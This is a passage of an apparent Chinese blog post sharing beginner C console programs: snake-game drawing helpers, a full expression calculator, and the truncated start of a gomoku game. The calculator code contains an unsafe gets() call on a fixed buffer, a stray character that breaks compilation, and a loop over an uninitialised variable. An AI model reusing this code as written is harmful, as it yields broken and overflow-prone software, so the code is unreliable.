class="line">if(tmp&#x3D;&#x3D;&#39;l&#39;&amp;&amp;way&#x3D;&#x3D;&#39;j&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;l&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void gotoxy_print(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(x,y);</span><br><span class="line">printf(&quot;卐&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void gotoxy_snake1(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(x,y);</span><br><span class="line">printf(&quot;■&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void gotoxy_snake2(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(x,y);</span><br><span class="line">printf(&quot; &quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void gotoxy_delete(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(x,y);</span><br><span class="line">printf(&quot;  &quot;);</span><br><span class="line">&#125;</span><br><span class="line">void gotoxy_food(int x, int y)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(x,y);</span><br><span class="line">printf(&quot;⊙&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="简易计算器"><a href="#简易计算器" class="headerlink" title="简易计算器"></a>简易计算器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"># include &lt;string.h&gt;</span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"># include &lt;math.h&gt;</span><br><span class="line">#include&lt;conio.h&gt;</span><br><span class="line">#include &lt;conio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include&lt;dos.h&gt;</span><br><span class="line">double add(double a, double b)&#x2F;&#x2F;  加法 </span><br><span class="line">&#123;</span><br><span class="line">return a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double sub(double a, double b)&#x2F;&#x2F; 减法 </span><br><span class="line">&#123;</span><br><span class="line">return a-b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double mul(double a, double b)&#x2F;&#x2F;乘法 </span><br><span class="line">&#123;</span><br><span class="line">return a*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double chu(double a, double b)&#x2F;&#x2F; 除法 </span><br><span class="line">&#123;</span><br><span class="line">return a&#x2F;b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void hellow(); </span><br><span class="line">void gotoxy(int x, int y) ;</span><br><span class="line">int data_handling(char ch[], char num[100][100]);</span><br><span class="line">double calculating_data(char num[100][100], int num_count);</span><br><span class="line">void calculate();</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">system(&quot;color 03&quot;);</span><br><span class="line">char out;</span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">system(&quot;cls&quot;);</span><br><span class="line">hellow();</span><br><span class="line">calculate();</span><br><span class="line">printf(&quot;按任意键继续，按Q退出:&quot;);</span><br><span class="line">scanf(&quot;%c&quot;, &amp;out);</span><br><span class="line">if(out&#x3D;&#x3D;&#39;Q&#39;)</span><br><span class="line">&#123;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void gotoxy(int x, int y) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 更新光标位置 </span><br><span class="line">COORD pos;</span><br><span class="line">HANDLE hOutput &#x3D; GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">pos.X &#x3D; x;</span><br><span class="line">pos.Y &#x3D; y;1</span><br><span class="line">SetConsoleCursorPosition(hOutput, pos);</span><br><span class="line">&#x2F;&#x2F; 隐藏光标 </span><br><span class="line">&#x2F;&#x2F;    CONSOLE_CURSOR_INFO cursor;</span><br><span class="line">&#x2F;&#x2F;cursor.bVisible &#x3D; FALSE;    </span><br><span class="line">&#x2F;&#x2F;cursor.dwSize &#x3D; sizeof(cursor);</span><br><span class="line">&#x2F;&#x2F;SetConsoleCursorInfo(hOutput, &amp;cursor);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">double calculating_data(char num[100][100], int num_count)&#x2F;&#x2F;  数据计算 </span><br><span class="line">&#123;</span><br><span class="line">double sum &#x3D; atof(num[0]);</span><br><span class="line">int i, j;</span><br><span class="line"></span><br><span class="line">for(j&#x3D;0; i&lt;num_count; i++)</span><br><span class="line">&#123;</span><br><span class="line">if( strcmp(num[i], &quot;**&quot;)&#x3D;&#x3D;0 )&#x2F;&#x2F;判断幂运算 </span><br><span class="line">&#123;</span><br><span class="line">sum &#x3D; pow(atof(num[i-1]), atof(num[i+1]));</span><br><span class="line">gcvt(sum, 50, num[i-1]);</span><br><span class="line">j &#x3D; i;</span><br><span class="line">while( (j+2)&lt;num_count )</span><br><span class="line">&#123;</span><br><span class="line">strcpy(num[j], num[j+2]);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">i--;</span><br><span class="line">num_count -&#x3D; 2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for(i&#x3D;0; i&lt;num_count; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">if( (strcmp(num[i], &quot;*&quot;)&#x3D;&#x3D;0)||(strcmp(num[i], &quot;&#x2F;&quot;)&#x3D;&#x3D;0) )</span><br><span class="line">&#123;</span><br><span class="line">if( num[i][0]&#x3D;&#x3D;&#39;*&#39; )</span><br><span class="line">&#123;</span><br><span class="line">sum &#x3D; mul(atof(num[i-1]), atof(num[i+1]));</span><br><span class="line">gcvt(sum, 50, num[i-1]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">sum &#x3D; chu(atof(num[i-1]), atof(num[i+1]));</span><br><span class="line">gcvt(sum, 50, num[i-1]);</span><br><span class="line">&#125;</span><br><span class="line">j &#x3D; i;</span><br><span class="line">while( (j+2)&lt;num_count )</span><br><span class="line">&#123;</span><br><span class="line">strcpy(num[j], num[j+2]);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">i--;</span><br><span class="line">num_count -&#x3D; 2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;0; i&lt;num_count; i++)</span><br><span class="line">&#123;</span><br><span class="line">if( strcmp(num[i],&quot;+&quot;)&#x3D;&#x3D;0 )</span><br><span class="line">&#123;</span><br><span class="line">sum &#x3D; add(atof(num[i-1]), atof(num[i+1]));</span><br><span class="line">gcvt(sum, 50, num[i-1]);&#x2F;&#x2F; 将浮点数转换为字符串 </span><br><span class="line">gcvt(sum, 50, num[i+1]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else if( strcmp(num[i],&quot;-&quot;)&#x3D;&#x3D;0 )</span><br><span class="line">&#123;</span><br><span class="line">sum &#x3D; sub(atof(num[i-1]), atof(num[i+1]));</span><br><span class="line">gcvt(sum, 50, num[i-1]);</span><br><span class="line">gcvt(sum, 50, num[i+1]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int data_handling(char ch[], char num[100][100])&#x2F;&#x2F; 数据处理 </span><br><span class="line">&#123;</span><br><span class="line">int i, num_count &#x3D; 0, j &#x3D; 0, key &#x3D; 0, kuohao_count &#x3D; 0, flag1 &#x3D; 0, flag2 &#x3D; 0;</span><br><span class="line">char *sin_num, x[100], *tmp, num_brackets[100], arr[100][100];</span><br><span class="line">double sum &#x3D; 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for(i&#x3D;0; ch[i]!&#x3D;&#39;\0&#39;; i++)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; 判断是否有中括号</span><br><span class="line">if( ch[i]&#x3D;&#x3D;&#39;[&#39; )</span><br><span class="line">&#123;</span><br><span class="line">if( (ch[i-1]!&#x3D;&#39;s&#39;)&amp;&amp;(ch[i-1]!&#x3D;&#39;c&#39;)&amp;&amp;(ch[i-1]!&#x3D;&#39;t&#39;)&amp;&amp;(ch[i-1]!&#x3D;&#39;l&#39;))</span><br><span class="line">&#123;</span><br><span class="line">tmp &#x3D; ch+i+1;</span><br><span class="line">for(j&#x3D;i; ch[j]!&#x3D;&#39;\0&#39;; j++)</span><br><span class="line">&#123;</span><br><span class="line">if( ch[j]&#x3D;&#x3D;&#39;]&#39; )</span><br><span class="line">&#123;</span><br><span class="line">ch[j] &#x3D; &#39;\0&#39;;</span><br><span class="line">strcpy(num_brackets, tmp);</span><br><span class="line">kuohao_count &#x3D; data_handling(num_brackets, arr);</span><br><span class="line">sum &#x3D; calculating_data(arr, kuohao_count);</span><br><span class="line">gcvt(sum, 100, x);</span><br><span class="line">strcpy(num[key], x);</span><br><span class="line">key++;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i &#x3D; j+1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;  判断是否小有括号</span><br><span class="line">if( ch[i]&#x3D;&#x3D;&#39;(&#39; )</span><br><span class="line">&#123;</span><br><span class="line">if( (ch[i-1]!&#x3D;&#39;s&#39;)&amp;&amp;(ch[i-1]!&#x3D;&#39;c&#39;)&amp;&amp;(ch[i-1]!&#x3D;&#39;t&#39;)&amp;&amp;(ch[i-1]!&#x3D;&#39;l&#39;) )</span><br><span class="line">&#123;</span><br><span class="line">tmp &#x3D; ch+i+1;</span><br><span class="line">for(j&#x3D;i; ch[j]!&#x3D;&#39;\0&#39;; j++)</span><br><span class="line">&#123;</span><br><span class="line">if( ch[j]&#x3D;&#x3D;&#39;)&#39; )</span><br><span class="line">&#123;</span><br><span class="line">ch[j] &#x3D; &#39;\0&#39;;</span><br><span class="line">strcpy(num_brackets, tmp);</span><br><span class="line">kuohao_count &#x3D; data_handling(num_brackets, arr);</span><br><span class="line">sum &#x3D; calculating_data(arr, kuohao_count);</span><br><span class="line">gcvt(sum, 100, x);</span><br><span class="line">strcpy(num[key], x);</span><br><span class="line">key++;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">i &#x3D; j+1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;判断三角运算标识字符 </span><br><span class="line">if( ch[i]&#x3D;&#x3D;&#39;s&#39;||ch[i]&#x3D;&#x3D;&#39;c&#39;||ch[i]&#x3D;&#x3D;&#39;l&#39;||ch[i]&#x3D;&#x3D;&#39;t&#39; )</span><br><span class="line">&#123;</span><br><span class="line">if( ch[i+1]&#x3D;&#x3D;&#39;i&#39;&amp;&amp;ch[i+2]&#x3D;&#x3D;&#39;n&#39;&amp;&amp;ch[i+3]&#x3D;&#x3D;&#39;(&#39; )</span><br><span class="line">&#123;</span><br><span class="line">sin_num &#x3D; ch+i+4;</span><br><span class="line">for(j&#x3D;i+4; ch[j]!&#x3D;&#39;\0&#39;; j++)</span><br><span class="line">&#123;</span><br><span class="line">if( ch[j]&#x3D;&#x3D;&#39;)&#39; )</span><br><span class="line">&#123;</span><br><span class="line">ch[j] &#x3D; &#39;\0&#39;;</span><br><span class="line">gcvt(sin(atof(sin_num)), 100, x);</span><br><span class="line">strcpy(num[key], x);</span><br><span class="line">key++;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else if( ch[i+1]&#x3D;&#x3D;&#39;o&#39;&amp;&amp;ch[i+2]&#x3D;&#x3D;&#39;s&#39;&amp;&amp;ch[i+3]&#x3D;&#x3D;&#39;(&#39; )</span><br><span class="line">&#123;</span><br><span class="line">sin_num &#x3D; ch+i+4;</span><br><span class="line">for(j&#x3D;i+4; ch[j]!&#x3D;&#39;\0&#39;; j++)</span><br><span class="line">&#123;</span><br><span class="line">if( ch[j]&#x3D;&#x3D;&#39;)&#39; )</span><br><span class="line">&#123;</span><br><span class="line">ch[j] &#x3D; &#39;\0&#39;;</span><br><span class="line">gcvt(cos(atof(sin_num)), 100, x);</span><br><span class="line">strcpy(num[key], x);</span><br><span class="line">key++;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else if( ch[i+1]&#x3D;&#x3D;&#39;n&#39;&amp;&amp;ch[i+2]&#x3D;&#x3D;&#39;(&#39; )</span><br><span class="line">&#123;</span><br><span class="line">sin_num &#x3D; ch+i+3;</span><br><span class="line">for(j&#x3D;i+3; ch[j]!&#x3D;&#39;\0&#39;; j++)</span><br><span class="line">&#123;</span><br><span class="line">if( ch[j]&#x3D;&#x3D;&#39;)&#39; )</span><br><span class="line">&#123;</span><br><span class="line">ch[j] &#x3D; &#39;\0&#39;;</span><br><span class="line">gcvt(log(atof(sin_num)), 100, x);</span><br><span class="line">strcpy(num[key], x);</span><br><span class="line">key++;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else if( ch[i+1]&#x3D;&#x3D;&#39;a&#39;&amp;&amp;ch[i+2]&#x3D;&#x3D;&#39;n&#39;&amp;&amp;ch[i+3]&#x3D;&#x3D;&#39;(&#39; )</span><br><span class="line">&#123;</span><br><span class="line">sin_num &#x3D; ch+i+4;</span><br><span class="line">for(j&#x3D;i+4; ch[j]!&#x3D;&#39;\0&#39;; j++)</span><br><span class="line">&#123;</span><br><span class="line">if( ch[j]&#x3D;&#x3D;&#39;)&#39; )</span><br><span class="line">&#123;</span><br><span class="line">ch[j] &#x3D; &#39;\0&#39;;</span><br><span class="line">gcvt(tan(atof(sin_num)), 100, x);</span><br><span class="line">strcpy(num[key], x);</span><br><span class="line">key++;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">i &#x3D; j+1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 判断 数字, 符号:+ - * &#x2F; </span><br><span class="line">if( (ch[i]&lt;&#x3D;&#39;9&#39;&amp;&amp;ch[i]&gt;&#x3D;&#39;0&#39;)&amp;&amp;flag1&#x3D;&#x3D;0 )</span><br><span class="line">    &#123;</span><br><span class="line">    sin_num &#x3D; ch+i;</span><br><span class="line">    flag1 &#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line">if( !(ch[i]&lt;&#x3D;&#39;9&#39;&amp;&amp;ch[i]&gt;&#x3D;&#39;0&#39;)&amp;&amp;ch[i]!&#x3D;&#39;.&#39;&amp;&amp;flag1&#x3D;&#x3D;1 )</span><br><span class="line">&#123;</span><br><span class="line">if( ch[i]&#x3D;&#x3D;&#39;+&#39;||ch[i]&#x3D;&#x3D;&#39;-&#39;||ch[i]&#x3D;&#x3D;&#39;*&#39;||ch[i]&#x3D;&#x3D;&#39;&#x2F;&#39; )</span><br><span class="line">&#123;</span><br><span class="line">if( ch[i+1]&#x3D;&#x3D;&#39;*&#39;)</span><br><span class="line">&#123;</span><br><span class="line">num[key+1][0] &#x3D; ch[i];</span><br><span class="line">num[key+1][1] &#x3D; ch[i+1];</span><br><span class="line"> num[key+1][2] &#x3D; &#39;\0&#39;;</span><br><span class="line"> ch[i] &#x3D; &#39;\0&#39;;</span><br><span class="line"> i++;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">num[key+1][0] &#x3D; ch[i];</span><br><span class="line"> num[key+1][1] &#x3D; &#39;\0&#39;;</span><br><span class="line">&#125; </span><br><span class="line">flag2 &#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line">ch[i] &#x3D; &#39;\0&#39;;</span><br><span class="line">strcpy(num[key], sin_num);</span><br><span class="line">flag1 &#x3D; 0;</span><br><span class="line">if( flag2&#x3D;&#x3D;1 )</span><br><span class="line">&#123;</span><br><span class="line">key +&#x3D; 2;</span><br><span class="line">flag2 &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">key++;</span><br><span class="line">&#125;</span><br><span class="line">if( ch[i]&#x3D;&#x3D;&#39;+&#39;||ch[i]&#x3D;&#x3D;&#39;-&#39;||ch[i]&#x3D;&#x3D;&#39;*&#39;||ch[i]&#x3D;&#x3D;&#39;&#x2F;&#39; )</span><br><span class="line">&#123;</span><br><span class="line">num[key][0] &#x3D; ch[i];</span><br><span class="line">num[key][1] &#x3D; &#39;\0&#39;;</span><br><span class="line">key++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ch[i] &#x3D; &#39;\0&#39;;</span><br><span class="line">strcpy(num[key], sin_num);</span><br><span class="line">return key+1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void calculate()</span><br><span class="line">&#123;</span><br><span class="line">char ch[1000],num[100][100];</span><br><span class="line">int  i, num_count, flag &#x3D; 0;</span><br><span class="line">double sum &#x3D; 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while( flag&#x3D;&#x3D;0 )</span><br><span class="line">&#123;</span><br><span class="line">fflush(stdin);</span><br><span class="line">gotoxy(3,3);</span><br><span class="line">gets(ch);</span><br><span class="line"></span><br><span class="line">for(i&#x3D;0; ch[i]!&#x3D;&#39;\0&#39;; i++)</span><br><span class="line">&#123;</span><br><span class="line">if( (ch[i]&lt;&#x3D;&#39;9&#39;)&amp;&amp;(ch[i]&gt;&#x3D;&#39;0&#39;) )</span><br><span class="line">&#123;</span><br><span class="line">flag &#x3D; 1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if( flag&#x3D;&#x3D;0 )</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(0,14);</span><br><span class="line">printf(&quot;输入数据有误!\n&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">num_count &#x3D; data_handling(ch,num);</span><br><span class="line">sum &#x3D; calculating_data(num, num_count); </span><br><span class="line">gotoxy(0,14);</span><br><span class="line">printf(&quot;&gt;&gt;&gt;%.2f\n&quot;, sum);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void hellow()</span><br><span class="line">&#123;</span><br><span class="line">    gotoxy(4,1);</span><br><span class="line">    printf(&quot;This is a simple calculator!&quot;);</span><br><span class="line"></span><br><span class="line">gotoxy(1,2);</span><br><span class="line">    printf(&quot;┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─┐ \n&quot;);</span><br><span class="line">    printf(&quot; │                              │ \n&quot;);</span><br><span class="line">    printf(&quot; │                              │ \n&quot;);</span><br><span class="line">    printf(&quot; ├ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─┤ \n&quot;);</span><br><span class="line">    printf(&quot; │   1    2    3       +     -  │ \n&quot;);</span><br><span class="line">    printf(&quot; │                              │ \n&quot;);</span><br><span class="line">    printf(&quot; │   4    5    6       *     &#x2F;  │ \n&quot;);</span><br><span class="line">    printf(&quot; │                              │ \n&quot;);</span><br><span class="line">    printf(&quot; │   7    8    9       cos   sin│  \n&quot;);</span><br><span class="line">    printf(&quot; │                              │ \n&quot;);</span><br><span class="line">    printf(&quot; │   0    .           &#x3D;     End │ \n&quot;);</span><br><span class="line">    printf(&quot; └ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─┘ \n&quot;);</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="五子棋"><a href="#五子棋" class="headerlink" title="五子棋"></a>五子棋</h3><p>一个朋友网上嫖的，看了看代码实现过程，发现学到的东西还挺多。编译环境vc6++，jpg要自己下载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 